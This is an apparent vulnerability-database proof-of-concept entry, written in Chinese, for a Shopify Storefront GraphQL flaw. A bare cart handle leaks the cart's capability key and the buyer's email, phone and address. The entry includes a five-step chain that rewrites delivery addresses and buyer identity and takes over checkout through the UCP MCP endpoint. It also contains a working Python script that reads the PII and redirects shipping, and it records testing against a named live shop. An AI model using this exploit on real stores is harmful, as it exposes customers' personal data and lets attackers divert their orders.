# Shopify Storefront GraphQL cartPrepareForCompletion 裸 handle 泄露 cap key 与收货 PII，可跨会话改写购物车/结账对象

- **code**: shopify-storefront-graphql-cartprepareforcompletion-裸-handle
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL / UCP MCP
- **versions**: Shopify Storefront GraphQL 2026-08-25（2023-01/2024-01/2024-10/2025-04/unstable 同）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测 retro-refresh.com（Shopify Shop 103967621452）：无 Cookie POST /api/graphql cartPrepareForCompletion(cartId=gid://shopify/Cart/hWNJ25uPww3jlbw76I6y1DtA) → 200 CartStatusReady，回显真实 ?key=6a27e57a02e27d80e75670b6850ba6b0、buyerIdentity={alice.victim.i129@example.com,+447911123456}、地址 Alice Victim/12 Rose Lane/Flat 3/London/SW1A 1AA；错 key deadbeef 回显相同，随机 handle 返回 null。用泄露 key 的 cartDeliveryAddressesUpdate → userErrors=[] 地址被改写为 Verifier PWN-i129/666 Redirect Lane/Manchester/M1 1AA；cartBuyerIdentityUpdate → attacker.i129@example.com；cartSubmitForCompletion → PAYMENTS_METHOD_REQUIRED。无 key GET /cart/c/{handle} → 302 下发 shop_pay_token JWT + 结账 cookie，get_checkout 页面内嵌 checkout gid+key；UCP update_checkout 写入 buyer.email=attacker.i129@example.com、destination=666 Redirect Lane 后 status=ready_for_complete（payment.instruments=[]）。cart cookie Set-Cookie 无 HttpOnly/Secure（cart=<handle>%3Fkey%3D<key>; SameSite=Lax）。证据目录 /opt/artex/data/tasks/9/i129-exec/。
- **path**: pocs/shopify-storefront-graphql-cartprepareforcompletion-裸-handle/shopify_cart_bare_handle_takeover.py
- **tags**: shopify,storefront-graphql,cart,capability-token,idor,pii,ucp
- **created_at**: 2026-11-11T18:30:13.091Z
- **engine**: https://retro-refresh.com/api/graphql

## 描述

判据：目标为 Shopify 托管店，POST /api/graphql 匿名可达；cartPrepareForCompletion 传 gid://shopify/Cart/<25位handle>（不带 ?key）若返回 CartStatusReady/NotReady 并回显 cart.id 中的真实 ?key、buyerIdentity 与 delivery.addresses，则 cap token 校验缺失。对照组：同 handle 加任意错 key 应回显逐字相同；随机 handle 应返回 {"result":null}。

利用链：1) 裸 handle 读真实 key + 完整收货 PII + note/attributes；2) 用 key 调 cartDeliveryAddressesUpdate 改地址、cartSelectedDeliveryOptionsUpdate 换配送、cartBuyerIdentityUpdate 改 email/phone、cartNoteUpdate/cartAttributesUpdate 注入履约指示；3) cartSubmitForCompletion 裸 handle 可推进到 PAYMENTS_METHOD_REQUIRED；4) GET /cart/c/{handle} 无 key 仍 302 到 shop.app 并下发 shop_pay_token + 结账 cookie，带 cookie GET ur_back_url 得 200 结账页并内嵌 checkout gid+key；5) 用该 checkout gid+key 调 POST /api/ucp/mcp tools/call update_checkout（meta.ucp-agent.profile=https://<shop>/.well-known/ucp），checkout={line_items:[{item:{id:variantGid},quantity:1}],buyer:{email,phone_number},fulfillment.methods[destinations=[{street_address,...}],selected_destination_id]} → buyer.email 与收货地址写入成功，status=ready_for_complete，仅 payment.instruments 为空。

坑：handle 25 位 base62 约 108bit 不可枚举，必须有泄漏源（共享 /cart/c/{handle} 链接、Referer、页面 JS、无 HttpOnly 的 cart cookie；cart cookie 值即 handle%3Fkey%3Dkey）；update_checkout 必须带 line_items 且 line_item_ids 用 checkout 内真实 CartLine gid，否则 200 但报 validation error；complete 支付需真实 payment instrument，拿不到。

## 用法

```
1) 先取一个真实变体：GET /products.json?limit=1 -> variants[0].id -> gid://shopify/ProductVariant/<id>\n2) 基线可将 cartCreate 写成受害侧购物车（buyerIdentity+delivery.addresses+note），拿到 handle。\n3) 运行本脚本：python3 shopify_cart_bare_handle_takeover.py https://<shop> <25位handle>\n4) 其他写操作替换 mutation：cartBuyerIdentityUpdate / cartSelectedDeliveryOptionsUpdate / cartNoteUpdate / cartAttributesUpdate。\n5) 无 key GET /cart/c/<handle> 取 302 的 ur_back_url，带 cookie GET 得结账页，正则取 gid://shopify/Checkout/<id> 与 key=<32hex>；POST /api/ucp/mcp tools/call update_checkout（arguments.meta.ucp-agent.profile 指向店铺 /.well-known/ucp，checkout.line_items 必填）即可写 checkout 的 buyer.email 与 fulfillment destinations。
```

## 正文

```
#!/usr/bin/env python3
# Shopify cart bare-handle -> cap key -> cross-session takeover (minimal POC)
import json, re, requests, sys
BASE = sys.argv[1] if len(sys.argv) > 1 else "https://retro-refresh.com"
HANDLE = sys.argv[2] if len(sys.argv) > 2 else "hWNJ25uPww3jlbw76I6y1DtA"
GQL = BASE + "/api/graphql"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}
S = requests.Session(); S.cookies.clear()

PREPARE = 'mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id note attributes{key value} buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 address2 city company provinceCode zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note} errors{code}}} userErrors{field message code}}}'

def gql(tag, q, v):
    r = S.post(GQL, json={"query": q, "variables": v}, headers=H, timeout=40)
    print(tag, r.status_code, r.text[:1200]); return r.json()

def main():
    j = gql("prepare(bare handle)", PREPARE, {"cartId": f"gid://shopify/Cart/{HANDLE}"})
    res = j.get("data", {}).get("cartPrepareForCompletion", {}).get("result") or {}
    cart = res.get("cart") or {}
    print("\nLEAKED id:", cart.get("id"))
    print("PII:", json.dumps({k: cart.get(k) for k in ("buyerIdentity", "note", "delivery")}, ensure_ascii=False))
    m = re.search(r"\?key=([0-9a-f]+)", cart.get("id", ""))
    if not m:
        print("no leaked key"); return
    key = m.group(1)
    addr = (cart.get("delivery", {}).get("addresses") or [{}])[0]
    print("\n-> write with leaked key:", key)
    U = 'mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} userErrors{field message code}}}'
    gql("address rewrite", U, {"cartId": f"gid://shopify/Cart/{HANDLE}?key={key}", "addresses": [{
        "id": addr.get("id"),
        "address": {"deliveryAddress": {"address1": "666 Redirect Lane", "address2": "Suite 6", "city": "Manchester",
            "company": "Verifier Labs", "countryCode": "GB", "firstName": "Verifier", "lastName": "PWN",
            "phone": "+447911123456", "provinceCode": "ENG", "zip": "M1 1AA"}},
        "selected": True}]})

if __name__ == "__main__":
    main()
```
